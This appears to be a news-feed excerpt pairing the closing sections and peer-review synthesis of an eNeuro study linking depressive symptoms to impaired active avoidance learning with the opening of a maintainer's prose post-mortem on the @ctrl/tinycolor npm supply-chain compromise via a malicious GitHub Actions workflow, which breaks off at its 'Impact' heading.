data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F9.large.jpg?download=true" title="Download Figure 9." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F9.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811676" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 9.</span></p><p id="p-65">Study 2: Performance comparison between reward-seeking and avoidance for active and inhibitory responses during the intermixed stage. <strong><em>A</em></strong>, Overall accuracy for active/inhibitory reward-seeking and avoidance in the intermixed stage. Individual data points (light green triangles for Active Reward-Seeking; light red triangles for Inhibitory Reward-Seeking, dark green circles for Active Avoidance, dark red circles for Inhibitory Avoidance) represent the proportion correct for each participant. Proportion correct reflects the ratio of successful responses relative to the total number of trials within each trial type. <strong><em>B</em></strong>, Accuracy for active/inhibitory reward-seeking and avoidance across blocks of six trials during the intermixed task stage. Shapes represent mean performance for each trial type across 10 blocks. Significant differences between (1) active reward-seeking and active avoidance, (2) inhibitory reward-seeking and inhibitory avoidance, and (3) active and inhibitory avoidance are indicated (<em>p</em> &lt; 0.001).</p></div></div><div id="T5"><p><span>Table 5.</span></p><p id="p-66">Study 2—2 × 2 within-subjects ANOVA for active and inhibitory response accuracy for intermixed task stage</p></div></div></div><div id="sec-30"><h4>Depressive symptom scores and active response accuracy</h4><p id="p-68">We used a linear mixed model to examine whether depressive symptoms (BDI-II, <em>z</em>-normalized, grand-mean centered) predicted accuracy on active trials (also <em>z</em>-normalized). Fixed effects included Sex (female, male), Task Stage (acquisition, intermixed), and Motivational Context (reward-seeking, avoidance), with Participant as a random intercept. This structure matched Study 1, with motivational context added. Motivational Context significantly influenced accuracy, with lower performance on avoidance trials (avoidance; <em>β</em> =−0.307, SE = 0.075, <em>t</em><sub>(978)</sub> = −4.11, <em>p</em> &lt; 0.001). However, BDI-II symptom scores were not significantly associated with active accuracy (<em>β</em> = 0.035, SE = 0.063, <em>t</em><sub>(1,050.90)</sub> = 0.56, <em>p</em> = 0.85), nor did they interact with Motivational Context (avoidance; <em>β</em> = 0.038, SE = 0.076, <em>t</em><sub>(978)</sub> = 0.496, <em>p</em> = 0.85). Thus, although avoidance reduced active accuracy this effect was not associated with depressive symptom scores. Full model results can be found at <a href="https://osf.io/5sepm/">https://osf.io/5sepm/</a>.</p><p id="p-69">To evaluate whether observed effects were sensitive to reference level selection, we conducted an exploratory series of eight linear mixed models, systematically varying the reference levels for Sex, Task Stage, and Motivational Context. This resulted in 128 tested effects (16 per model, including main effects and interactions), and <em>p</em> values were adjusted using Benjamini–Hochberg FDR across all 128 effects. While no significant effects of BDI-II emerged in the initial model, exploratory analyses identified a significant BDI-II × Sex interaction (<em>β</em> = −0.365, SE = 0.121, <em>t</em><sub>(1,050.90)</sub> = −3.02, <em>p</em><sub>adjusted</sub> = 0.026), specifically in the avoidance context during the intermixed stage. This exploratory finding suggests the possibility that sex differences in the relationship between depressive symptoms and instrumental behavior may emerge when active responses are well-learned and inhibitory demands are newly introduced—potentially reflecting sex-specific dynamics in threat processing during later phases of learning. Full model results can be found at <a href="https://osf.io/5sepm/">https://osf.io/5sepm/</a>.</p></div><div id="sec-31"><h4>Depressive symptom scores and inhibitory response accuracy</h4><p id="p-70">A similar linear mixed model was used to examine whether depressive symptom scores (BDI-II, <em>z</em>-normalized) predicted accuracy on inhibitory trials. Fixed effects include Sex (female, male) and Motivational Context (reward-seeking, avoidance) and Participant as a random intercept. Motivational Context significantly affected inhibitory accuracy, with higher performance in the avoidance context (avoidance; <em>β</em> = 0.570, SE = 0.064, <em>t</em><sub>(326)</sub> = 8.95, <em>p</em> &lt; 0.001). However, BDI-II symptom scores were not significantly associated with inhibitory accuracy (<em>β</em> = −0.074, SE = 0.063, <em>t</em><sub>(534.47)</sub> = −1.18, <em>p</em> = 0.28), nor was there a significant interact with BDI-II and Motivational Context (avoidance; <em>β</em> = 0.030, SE = 0.065, <em>t</em><sub>(326)</sub> = 0.47, <em>p</em> = 0.64). Thus, although participants showed lower accuracy for inhibitory reward-seeking trials compared with avoidance trials, this pattern was not associated with depressive symptom severity.</p></div></div></div><div id="sec-32"><h2>Discussion</h2><p id="p-71">In this study we report that higher depressive scores are associated with a reduced capacity to learn active avoidance behaviors, while no relationship was observed with inhibitory avoidance. Specifically, Study 1 extended rodent research on active and inhibitory avoidance to a human nonclinical sample, revealing that higher depressive symptoms predicted lower accuracy during the acquisition phase of active avoidance (<a id="xref-fig-5-2" href="#F5">Fig. 5</a>) and a greater number of trials required to reach criterion performance (<a id="xref-fig-4-3" href="#F4">Fig. 4<em>B</em></a>). In contrast, depressive symptom scores were not related to performance on inhibitory avoidance trials. Additionally, within-subjects analyses indicated that overall, inhibitory avoidance was performed more readily compared with active avoidance, as indicated by higher accuracy during the intermixed and reversal stages (<a id="xref-fig-3-4" href="#F3">Fig. 3<em>B</em>,<em>C</em></a>). Altogether, these findings highlight a selective impairment in active avoidance learning associated with depressive symptoms and underscore the importance of considering how this relationship may vary across different learning phases. This dynamic pattern warrants further investigation into the underlying cognitive and neural processes that constrain avoidance behavior in depression.</p><p id="p-72">Our findings in Study 1 partially support the predictions of the ACDM framework, which posit that depression is associated with a greater tendency toward inaction in avoidance contexts (<a id="xref-ref-9-4" href="#ref-9">Bishop and Gagne, 2018</a>). Using this framework, the decision to act is calculated as the difference between the product of estimated outcome value and probability and the estimated cost of deploying effort to obtain a desired outcome. In depression, inaction may arise from overestimating effort costs, undervaluing outcomes, or underestimating outcome probability. Notably, because our task used a deterministic reinforcement schedule, outcome uncertainty is unlikely to account for the observed deficit. If overestimation of effort costs were solely responsible for these deficits, one would expect consistent active avoidance impairments across all task stages. However, since effort demands remained constant (i.e., the number of button presses required to obtain the desired outcome) and inaction was most pronounced during the acquisition phase—when fatigue-related effort costs were likely minimal—alternative explanations must be considered. Another possibility is that individuals with elevated levels of depressive symptoms became increasingly sensitive to the aversive outcome over time—effectively overvaluing the punishment and potentially overriding initial biases against deploying effort. Consistent with this interpretation, several studies have demonstrated that individuals with depression show increased sensitivity to negative feedback (<a id="xref-ref-23-1" href="#ref-23">Elliott et al., 1997</a>; <a id="xref-ref-25-1" href="#ref-25">Eshel and Roiser, 2010</a>), particularly in probabilistic reversal learning tasks, where they are more likely to switch following misleading negative feedback (<a id="xref-ref-50-2" href="#ref-50">Murphy et al., 2003</a>; <a id="xref-ref-67-1" href="#ref-67">Taylor Tavares et al., 2008</a>). However, other work suggests that the negativity bias in depression may not reflect punishment hypersensitivity per se, but rather blunted responsiveness to reward, resulting in a relative overweighting of negative outcomes (<a id="xref-ref-60-3" href="#ref-60">Robinson et al., 2012</a>). Still other studies have reported reduced sensitivity to both reward and punishment in depressed individuals (<a id="xref-ref-49-5" href="#ref-49">Mukherjee et al., 2020</a>). This heterogeneity likely reflects differences in task structure (i.e., deterministic vs probabilistic reinforcement), cognitive control demands (i.e., attending to and memorizing cue–response associations), and sample characteristics such as comorbid anxiety, sex, IQ, and medication status. Regardless, our findings suggest that the relationship between depressive symptoms and active avoidance is dynamic, with experience-dependent shifts across phases of avoidance.</p><p id="p-73">Clarifying how the neural circuits regulating active avoidance are dynamically engaged over time may offer critical insight into motivational dysfunction in depression. Evidence from both human and animal studies highlights the role of species-specific defensive reactions (SSDRs), where freezing is a prepotent response in aversive contexts (<a id="xref-ref-10-2" href="#ref-10">Bolles, 1970</a>; <a id="xref-ref-27-1" href="#ref-27">Fanselow, 1994</a>; <a id="xref-ref-43-1" href="#ref-43">LeDoux et al., 2017</a>). For successful active avoidance, both humans and rodents must overcome these prepotent defensive responses to engage in instrumental, goal-directed action. From a neural circuitry perspective, considerable progress has been made in understanding the mechanisms underlying the acquisition of active avoidance (<a id="xref-ref-43-2" href="#ref-43">LeDoux et al., 2017</a>; <a id="xref-ref-12-1" href="#ref-12">Cain, 2019</a>). Early in avoidance training, SSDRs are largely driven by amygdala circuits that promote behavioral suppression. With repeated training, however, ventromedial prefrontal systems (homologs of infralimbic cortex, Area 25 of anterior cingulate) increasingly suppress amygdala activity to reduce freezing and facilitate goal-directed avoidance responses (<a id="xref-ref-48-1" href="#ref-48">Moscarello and LeDoux, 2013</a>). These dynamics suggest that individuals with elevated depressive symptoms may exhibit difficulty in suppressing prepotent defensive responses during early learning—potentially due to dysfunction in cortico-limbic-striatal circuits that support the shift from reactive to goal-directed control. This provides a plausible neurobiological mechanism for the symptom-related impairments in active avoidance observed during the acquisition phase, while performance at later stages remains unaffected.</p><p id="p-74">Moving to research in humans, the dual competition model (<a id="xref-ref-56-2" href="#ref-56">Pessoa, 2009</a>) proposes the effects of emotionally salient stimuli on task performance depends both on the level of arousal evoked by a stimulus and on whether the stimulus aligns with or opposes the action tendency evoked by the stimulus. Prepotent behavioral responses to avoid punishment and approach reward, mediated in part by prefrontal regions, have been reliably observed in human neuroimaging studies (<a id="xref-ref-32-1" href="#ref-32">Guitart-Masip et al., 2012</a>; <a id="xref-ref-1-1" href="#ref-1">Asci et al., 2019</a>). In depression, disruptions in top-down regulatory control have been linked to reduced activity in dorsolateral and dorsomedial prefrontal cortex (dlPFC, dmPFC) and rostral ACC (rACC), along with elevated and sustained amygdala activity in response to negative feedback or emotional salient stimuli (<a id="xref-ref-63-1" href="#ref-63">Siegle et al., 2007</a>; <a id="xref-ref-26-2" href="#ref-26">Fales et al., 2008</a>; <a id="xref-ref-67-2" href="#ref-67">Taylor Tavares et al., 2008</a>). This pattern may indicate that emotionally salient cues disproportionately influence behavior due to weakened regulatory input from cognitive control systems. As a result, the capacity to override prepotent defensive responses—particularly during early stages of active avoidance learning—may be compromised in depression. Recent work further supports this interpretation, showing that reductions in GABA within the rACC were associated with decreased functional connectivity across cortico-striatal-limbic circuits in females with MDD (<a id="xref-ref-38-1" href="#ref-38">Ironside et al., 2021</a>)—a finding especially relevant given our predominantly female sample.</p><div id="sec-33"><h3>Avoidance mechanisms in depression and related disorders</h3><p id="p-75">To contextualize our findings, it is important to position them within the broader literature on avoidance across psychiatric disorders, highlighting key conceptual differences and points of convergence. For instance, many studies define avoidance as the decreased selection of high-loss options in probabilistic selection tasks—a definition that differs meaningfully from the framework used here but useful for understanding sensitivity to reward and negative feedback. <a id="xref-ref-16-4" href="#ref-16">Chase et al. (2010)</a> used a probabilistic selection task to examine feedback learning in individuals with MDD and found reduced learning rates for both positive and negative feedback during training, particularly among individuals with higher anhedonia. This suggests blunted reinforcement learning rather than a valence-specific bias such as altered sensitivity to negative feedback. Nonetheless, this profile is consistent with our observed impairment in active avoidance acquisition, despite differences in task design.</p><p id="p-76"><a id="xref-ref-49-6" href="#ref-49">Mukherjee et al. (2020)</a> extended this work using probabilistic reversal learning and found that MDD patients—most of whom were medicated—selected fewer rich options following reversals and exhibited reduced win-stay behavior (i.e., less likely to repeat a rewarded choice), but no difference in lose-shift behavior (i.e., switching after punishment). If depression involved heightened punishment sensitivity, an increase in lose-shift behavior would be expected. The absence of this effect supports the idea of diminished reward sensitivity rather than increased responsiveness to punishment. This interpretation aligns with the possibility that symptom-related impairments in active avoidance reflect deficits in safety learning rather than heightened punishment sensitivity that interacts with effort-related biases. Safety learning—the process of learning about cues that predict the absence of threat (<a id="xref-ref-42-1" href="#ref-42">Laing et al., 2025</a>)—has been shown to promote instrumental avoidance learning in animals and humans (<a id="xref-ref-28-1" href="#ref-28">Fernando et al., 2014</a>; <a id="xref-ref-29-1" href="#ref-29">Fisher and Urcelay, 2024</a>). Impaired learning of safety signals may contribute to reduced active avoidance performance, even in aversively motivated contexts. Given that safety learning is supported by amygdala and vmPFC circuitry (<a id="xref-ref-40-1" href="#ref-40">Kong et al., 2014</a>), this may offer a more parsimonious explanation for acquisition-specific effects than models emphasizing the accumulation of punishment sensitivity and effort-related bias.</p><p id="p-77">Neuromodulator systems may further complicate interpretation, as both serotonin and dopamine are implicated in punishment and reward learning. SSRIs, commonly prescribed in MDD, are known to blunt negative feedback sensitivity (<a id="xref-ref-35-1" href="#ref-35">Herzallah et al., 2013</a>). Supporting this, low doses of the antidepressant citalopram—which attenuate serotonin signaling—increase lose-shift behavior and sensitivity to punishment in both rodents and humans (<a id="xref-ref-15-1" href="#ref-15">Chamberlain et al., 2006</a>; <a id="xref-ref-3-1" href="#ref-3">Bari et al., 2010</a>). However, findings from obsessive compulsive disorder (OCD) populations highlight more nuanced effects of serotonergic modulation: <a id="xref-ref-24-2" href="#ref-24">Endrass et al. (2011)</a> found greater sensitivity to negative feedback in medicated OCD patients with elevated depressive symptoms, but only after initial learning—consistent with the idea that punishment sensitivity may build with experience. In contrast, <a id="xref-ref-54-2" href="#ref-54">Palminteri et al. (2012)</a> reported no valence-specific effects of medication status in OCD patients using a task previously linking dopamine to punishment learning (<a id="xref-ref-53-1" href="#ref-53">Palminteri et al., 2009</a>).</p><p id="p-78">Motivational impairments similar to those in depression are also evident in schizophrenia, particularly in relation to altered dopamine signaling. In unmedicated patients, <a id="xref-ref-59-2" href="#ref-59">Reinen et al. (2016)</a> found blunted prediction error BOLD signals in the striatum and mPFC for rewards, but intact response to punishment, suggesting D2 tone may selectively dampen reward while keeping punishment signaling intact. Similarly, <a id="xref-ref-72-2" href="#ref-72">Waltz et al. (2018)</a> reported reduced differential activation to gain versus loss-avoidance in vmPFC, ACC, and ventral striatum (VS), with diminished activation in VS associated with higher negative symptom scores. Sex differences in dopaminergic responses to loss versus gain have also been observed. Using PET during the monetary incentive delay task, <a id="xref-ref-33-1" href="#ref-33">Hahn et al. (2021)</a> found females exhibited heightened VS dopaminergic responses to punishment relative to gain. Together, these findings suggest that disrupted valuation and motivational processes, linked to both dopamine and serotonin signaling, may reflect cortico-striatal-limbic dysfunction as a transdiagnostic mechanism across conditions like OCD, schizophrenia, and depression.</p><p id="p-79">Overall, these studies underscore the dynamic nature of avoidance, which may shift with experience (i.e., acquisition, expression, habit) and neuromodulatory state. If punishment sensitivity increases with experience, it may eventually override early inaction driven by effort-related biases. Alternatively, if deficits are more prominent for reward-related signals, disrupted safety learning may play a greater role. Future computational modeling that integrates effort costs, punishment and reward sensitivity, and safety learning mechanisms will be critical for disentangling these processes and clarifying how depressive symptoms influence active avoidance behavior.</p></div><div id="sec-34"><h3>Motivational context influences accuracy of instrumental actions</h3><p id="p-80">Study 2 examined whether poorer active avoidance performance reflect a general bias toward effort minimization or context-specific effects by assessing active and inhibitory responses across both reward-seeking and avoidance contexts. While depressive symptom scores were not significantly related to performance, robust within-subjects effects emerged. Participants performed more accurately on trials aligned with their prepotent tendencies—active reward-seeking and inhibitory avoidance—consistent with prior research demonstrating approach biases for reward and withdrawal biases for punishment (<a id="xref-ref-18-1" href="#ref-18">Crockett et al., 2009</a>; <a id="xref-ref-32-2" href="#ref-32">Guitart-Masip et al., 2012</a>; <a id="xref-ref-46-3" href="#ref-46">Mkrtchian et al., 2017</a>; <a id="xref-ref-1-2" href="#ref-1">Asci et al., 2019</a>).</p><p id="p-81">Prefrontal regions such as the anterior prefrontal cortex (aPFC) and orbitofrontal (OFC) are implicated in overcoming these motivational-action conflicts (<a id="xref-ref-61-1" href="#ref-61">Roelofs et al., 2009</a>; <a id="xref-ref-71-1" href="#ref-71">Volman et al., 2011</a>). If the poorer performance for active versus inhibitory avoidance observed in Study 1 were driven by a general preference to minimize effort, we would expect a similar pattern for active reward-seeking in Study 2. However, this pattern did not emerge, suggesting that effort bias alone does not account for these findings.</p><p id="p-82">Parallel findings in humans and animals suggest that newly learned discriminative cues can differentially influence instrumental behavior depending on whether the context is appetitive or aversive (<a id="xref-ref-66-1" href="#ref-66">Talmi et al., 2008</a>; <a id="xref-ref-31-1" href="#ref-31">Geurts et al., 2013</a>; <a id="xref-ref-46-4" href="#ref-46">Mkrtchian et al., 2017</a>; <a id="xref-ref-51-2" href="#ref-51">Nord et al., 2018</a>; <a id="xref-ref-13-1" href="#ref-13">Campese, 2021</a>). Consistent with this, participants in the current study more readily inhibited responses in avoidance context than in reward-seeking contexts. Remarkably, rats display similar patterns, with greater accuracy for active responses during reward seeking and greater inhibitory accuracy during avoidance (<a id="xref-ref-19-1" href="#ref-19">Dalton et al., 2025</a>).</p><p id="p-83">Although these performance differences could be attributed to differences in the motivational value of the reward and the punishment outcomes, this explanation is unlikely. No significant main effect of motivational context was found during the intermixed task stage. Specifically, the average accuracy for reward-seeking and avoidance trials (irrespective of response type) did not differ. This suggests that the outcomes were equally motivating overall and not biased toward one context. Instead, the observed interaction is more consistent with the context-dependent effect of prepotent response tendencies influencing instrumental actions.</p><p id="p-84">While depression is typically associated with reduced reward-seeking, the ACDM framework predicts a broader bias toward inaction across both reward-seeking and avoidance contexts, driven by overestimation of effort costs. In Study 1, higher depressive symptom scores were associated with reduced active avoidance performance—consistent with this framework. However, contrary to our hypotheses, depressive symptoms were not significantly associated with active or inhibitory response accuracy in either motivational context.</p><p id="p-85">Several key differences may account for these null findings. First, the mixed-motivation task employed an interleaved design, requiring participants to frequently switch between responding to appetitive and aversive stimuli, rather than engaging with each in distinct blocks. This design placed avoidance trials within a broader reward-rich context, attenuating depression-related impairments in active avoidance—potentially due to the prepotent tendency to approach reward. This interpretation aligns with findings from approach-avoidance conflict paradigms—where conditions involving potential reward despite the risk of punishment are more likely to elicit active approach behavior than avoidance-only conditions (<a id="xref-ref-2-1" href="#ref-2">Aupperle et al., 2011</a>). Second, the four-condition task structure (active vs inhibitory and reward-seeking vs avoidance) likely imposed greater working memory demands, which have been implicated in reward/punishment learning (<a id="xref-ref-70-1" href="#ref-70">Van Der Schaaf et al., 2014</a>). These cognitive demands may have masked the influence of depressive symptoms on performance. Future studies may consider controlling for cognitive load to better isolate symptom-specific effects. Finally, Study 1 took place during the height of the COVID-19 pandemic, a contextual factor that may have influenced affective states and task engagement in ways that were not present during Study 2.</p><p id="p-86">Although no association between depressive symptoms were found in Study 2, the robust within-subjects effects suggest this task may be useful for assessing motivated behavior in other psychiatric populations. For example, research on substance use disorder emphasizes the strong motivational salience of reward and punishment related cues, particularly those associated with drug use.</p></div><div id="sec-35"><h3>Conclusion</h3><p id="p-87">Although depression is often linked with reward-processing deficits like anhedonia (<a id="xref-ref-68-1" href="#ref-68">Treadway and Zald, 2011</a>; <a id="xref-ref-69-2" href="#ref-69">Treadway et al., 2012</a>), our findings reveal a novel link between symptom severity and impaired active avoidance learning in aversive contexts. A key limitation is whether these results generalize to clinical populations. Depression is increasingly understood as a dimensional condition, with clinical diagnoses reflecting the more severe end of a broader symptom spectrum and avoidance impairments representing a potential transdiagnostic feature (<a id="xref-ref-22-1" href="#ref-22">Eaton et al., 2023</a>). Our sample included a wide range of depressive symptom scores, with many participants self-reporting prior diagnoses or scoring above clinical cutoffs, supporting the relevance of our findings to clinical populations. Furthermore, this dimensional approach may offer a more nuanced understanding of symptom-related effects on avoidance behavior and extend to other psychiatric conditions, such as OCD and schizophrenia, that share overlapping motivational and affective features with depression.</p><p id="p-88">Another limitation of our study was the higher than expected exclusion rates, which warrant a closer examination of their potential impact on results. Both tasks were designed as reinforcement-based learning paradigms with minimal instructions, no explicit information on cue–response contingencies, and no practice trials. While this design enhances translational relevance, it likely contributed to the variability in participants’ ability to acquire the task contingencies. Although higher exclusion rates were anticipated, the rates observed—39.37% in Study 1 and 57.20% in Study 2—exceeded expectations and were primarily due to failure to meet behavioral performance criteria. However, when considering only exclusions related to questionnaire failures or task noncompletion, rates were consistent with typical online studies (Study 1: 19.17%, Study 2: 19.20%; <a id="xref-ref-65-1" href="#ref-65">Suzuki et al., 2021</a>). To assess potential bias, we compared included participants to those who passed attention checks but were later excluded for other reasons (see <a href="https://osf.io/5sepm/">https://osf.io/5sepm/</a>). In Study 1, excluded participants had significantly higher BAI scores, but not BDI-II scores. While the ACDM framework does not explicitly make predictions about how depressive and anxiety symptoms interact, it implies that their effects may counterbalance one another. In the context of our study, anxiety symptoms could offset the depressive impairments in active avoidance by promoting increased avoidance effort. This antagonistic dynamic suggests that higher exclusion rates may have reduced confounding influences rather than introduce bias. Importantly, BDI-II scores did not differ between included and excluded groups, preserving the validity of our primary analyses. Sex differences in exclusion rates were also observed, with a higher proportion of females excluded. However, both final samples remained predominantly female—the group in which we observed our strongest effects—suggesting any bias would likely underestimate, rather than inflate our findings. For these reasons, we believe the interpretation and relevance of our findings are still valid. However, future adaptations of this task may benefit from optimizing the trade-off between ecological validity and participant retention.</p><p id="p-89">Across two studies, we sought to extend rodent research to investigate patterns of active and inhibitory avoidance and reward-seeking in a nonclinical sample varying in depressive symptoms. By integrating self-report and behavioral measures, we aimed to strengthen translational links between preclinical models and depressive symptom severity in humans. Our findings highlight the value of transdiagnostic approaches in a community sample for bridging bench and clinic in understanding psychiatric disorders. Results demonstrate an important link between depressive symptoms and reduced efficacy at learning to override a prepotent response to inhibit action to avoid unpleasant events. Future work should test whether these effects replicate in clinically diagnosed MDD populations, use computational models to probe underlying mechanisms, and apply neuroimaging to evaluate cross-species convergence in neural circuitry.</p></div></div><div id="fn-group-1"><h2>Footnotes</h2><ul><li id="fn-1"><p id="p-1">The authors declare no competing financial interests.</p></li><li id="fn-3"><p id="p-3">We thank Veronica Dudarev for her advice on statistical analysis, as well as the contributions of Imogen Daly for creation and recording sound stimuli, and Karen Ip. 
This work was supported by the Natural Sciences and Engineering Research Council of Canada (NSERC) grant (#F19-05182) to R.M.T., the UBC Djavad Mowafaghian Centre for Brain Health Innovation Fund Kickstart Research Grant (#F19-05932), the Michael Smith Foundation for Health Research Scholar Award to R.M.T., and an NSERC Postgraduate Scholarship – Doctoral (PGS-D) award to R.J.T.</p></li></ul></div><p id="p-4">This is an open-access article distributed under the terms of the <a href="https://creativecommons.org/licenses/by/4.0/" rel="license">Creative Commons Attribution 4.0 International license</a>, which permits unrestricted use, distribution and reproduction in any medium provided that the original work is properly attributed.</p><div id="sec-36"><h2>Synthesis</h2><div id="boxed-text-1"><p id="p-90">Reviewing Editor: Ifat Levy, Yale School of Medicine</p><p id="p-91">Decisions are customarily a result of the Reviewing Editor and the peer reviewers coming together and discussing their recommendations until a consensus is reached. When revisions are invited, a fact-based synthesis statement explaining their decision and outlining what is needed to prepare a revision will be listed below. The following reviewer(s) agreed to reveal their identity: Ziv Ben-Zion.</p></div><p id="p-92">The present study examined the relationship between depressive symptoms and active/inhibitory avoidance behavior in general populations. The authors demonstrated that depressive symptoms (BDI-II scores) are negatively associated with the accuracy of active avoidance in the avoidance Go/NoGo task, particularly among younger participants. This relationship did not emerge in the mixed version of the task (i.e., a combination of reward-seeking and avoidance). Given these findings, the authors argue that their work may help bridge the gap between preclinical animal research and clinical studies.</p><p id="p-93">This is an interesting paper, which may provide new insights into the relationship between depressive symptoms and avoidance learning using a reverse-translated avoidance task from rodent models. Reviewers identified, however, unclear aspects of the conceptual framework, as well as the methods and results, which should be addressed.</p><p id="p-94">- The authors should provide more background, to position their study in the context of prior research. They should be clear on whether and how the work is conceptually novel. If this is a replication, this is totally fine, but should be explicitly said.</p><p id="p-95">- The authors should discuss earlier research on psychiatric symptoms and avoidance behavior using simple decision-making tasks applicable to rodent models (for example: https://pubmed.ncbi.nlm.nih.gov/22420038/; https://pubmed.ncbi.nlm.nih.gov/19607754/; https://pubmed.ncbi.nlm.nih.gov/33001663/; https://pubmed.ncbi.nlm.nih.gov/22325972/; https://pubmed.ncbi.nlm.nih.gov/21284070/; https://pubmed.ncbi.nlm.nih.gov/28343697/; https://pubmed.ncbi.nlm.nih.gov/29486865/; https://pubmed.ncbi.nlm.nih.gov/27105903/; and https://pubmed.ncbi.nlm.nih.gov/34151477/).</p><p id="p-96">The authors should explain how their findings relate to these previous studies.</p><p id="p-97">- The authors describe the brain regions identified in animal research as related to active and inhibitory avoidance. However, it is unclear how these findings translate to humans. The statement that "Neural activation of these regions is found in humans performing avoidance tasks" is too general-are distinct brain regions implicated in active vs. inhibitory avoidance in humans? Similarly, the claim that "depression has been linked to structural or atypical patterns of activation in homologous brain regions in humans" lacks specificity. Could the authors provide more precise evidence from human neuroimaging studies to clarify these points?</p><p id="p-98">- The authors clearly articulate their research objective and hypothesis, but some aspects could be clarified. First, why was a non-clinical sample chosen instead of a clinical one? How might this impact the generalizability of findings to clinical depression? Second, the hypothesis states that depressive symptoms will impair active avoidance, but do the authors expect a similar or different effect for inhibitory avoidance? Clarifying these points would strengthen the rationale for the study.</p><p id="p-99">- The authors conducted numerous statistical tests as part of their main analyses. For instance, according to the description in lines 269-274, the main findings involved the effects of BDI-II and the interaction of Sex and Sample on active and inhibitory avoidance accuracies, amounting to more than 20 tests. This raises a concern about the robustness of the results - p-values should be properly corrected for multiple comparisons.</p><p id="p-100">- In the mixed-effect models, why was Age omitted (i.e., replaced by Sample)? Ideally, a single model would include all relevant variables. Furthermore, it is unclear why the authors included only a random intercept rather than also considering random slopes (e.g., for task stages), which could vary across participants. Were the variables in these models z-normalized?</p><p id="p-101">- The negative association between BDI-II scores and active avoidance accuracy emerged in the avoidance task but not in the mixed task. Could the authors speculate about the meaning of this discrepancy? Does it suggest that the relationship is highly context-dependent?</p><p id="p-102">- In Study 1, 302 of 767 participants were excluded, and in Study 2, 439 of 769 were excluded. Such high exclusion rates - over half of each sample - are unusual. Even in online experiments on crowdsourcing services, the exclusion rate typically does not exceed 30%. It would be informative to detail what attention checks were employed and how many participants failed each criterion. This issue also warrants discussion in the Discussion section.</p><p id="p-103">- Do the authors have any data regarding participants' general intelligence (e.g., educational background or IQ)? Differences between undergraduate and online participants may be attributable to such factors.</p><p id="p-104">- Mental disorders frequently co-occur - in particular, depression often co-occurs with anxiety. Thus, it is possible that the BDI-II scores were influenced by symptoms other than depression. Commenting on this possibility, and on how the ACDM framework handles this would be helpful.</p><p id="p-105">- Was the aversive sound truly aversive? Is there any data to support this claim?</p><p id="p-106">- please provide more detail on the effort and volume calibration procedures.</p><p id="p-107">- The methods and results sections are very long. Please try to streamline descriptions of procedures, statistical methods, and secondary analyses where possible.</p></div></div> <!-- /.panel-row-wrapper -->	
	
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tinycolor supply chain attack post-mortem (159 pts)]]></title>
            <link>https://sigh.dev/posts/ctrl-tinycolor-post-mortem/</link>
            <guid>45278657</guid>
            <pubDate>Wed, 17 Sep 2025 17:18:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sigh.dev/posts/ctrl-tinycolor-post-mortem/">https://sigh.dev/posts/ctrl-tinycolor-post-mortem/</a>, See on <a href="https://news.ycombinator.com/item?id=45278657">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  <h2 id="tldr"><a href="#tldr">TL;DR</a></h2>
<p>A malicious GitHub Actions workflow was pushed to a shared repo and exfiltrated a npm token with broad publish rights. The attacker then used that token to publish malicious versions of 20 packages, including <code>@ctrl/tinycolor</code>.</p>
<p>My GitHub account, the @ctrl/tinycolor repository were not directly compromised. There was no phishing involved, and no malicious packages were installed on my machine and I already use pnpm to avoid unapproved postinstall scripts. There was no pull request involved because a repo admin does not need a pull request to add new github actions.</p>
<p>GitHub/npm security responded quickly, unpublishing the malicious versions. I followed by releasing clean versions to flush caches, as advised.</p>
<p>For broader context, see <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages" rel="noreferrer noopener" target="_blank">Socket’s write-up</a> or <a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised" rel="noreferrer noopener" target="_blank">StepSecurity’s analysis</a>. For community discussion, see this <a href="https://news.ycombinator.com/item?id=45260741" rel="noreferrer noopener" target="_blank">Hacker News post</a>, which spent 24 hours on the front page. I’m also finding this <a href="https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack" rel="noreferrer noopener" target="_blank">wiz.io</a> post helpful.</p>
<h2 id="how-i-found-out"><a href="#how-i-found-out">How I Found Out</a></h2>
<p>On September 15 around 4:30
 PM PT, <a href="https://bsky.app/profile/notwes.bsky.social" rel="noreferrer noopener" target="_blank">Wes Todd</a> DM’d me on Bluesky and looped me into the OpenJS Foundation Slack. By that point, Wes had already alerted GitHub/npm security, who were compiling lists of affected packages and rapidly unpublishing compromised versions.</p>
<p>Early guidance (attributed to Daniel Pereira) was to look for suspicious <code>Shai-Hulud</code> repos or branches. I wasn’t able to find any of these repos or branches on my own personal repos. The mystery was: how was I impacted at all?</p>
<blockquote>
<p>Shai-Hulud was the Fremen term for the sandworm of Arrakis. - <a href="https://dune.fandom.com/wiki/Shai-Hulud" rel="noreferrer noopener" target="_blank">dune wiki</a></p>
</blockquote>
<h2 id="what-actually-happened"><a href="#what-actually-happened">What Actually Happened</a></h2>
<p>A while ago, I collaborated on <a href="https://github.com/angulartics/angulartics2" rel="noreferrer noopener" target="_blank">angulartics2</a>, a shared repository where multiple people still had admin rights. That repo still contained a GitHub Actions secret — a npm token with broad publish rights. This collaborator had access to projects with other people which I believe explains some of the other 40 initial packages that were affected.</p>
<p>A new Shai-Hulud branch was force pushed to angulartics2 with a malicious github action workflow by a collaborator. The workflow ran immediately on push (did not need review since the collaborator is an admin) and stole the npm token. With the stolen token, the attacker published malicious versions of 20 packages. Many of which are not widely used, however the @ctrl/tinycolor package is downloaded about 2 million times a week.</p>
<p>GitHub and npm security teams moved quickly to unpublish the malicious versions. I then re-published fresh, verified versions of the packages I maintain to flush caches and restore trust.</p>
<h2 id="impact"><a href="#impact">Impact</a></h2>
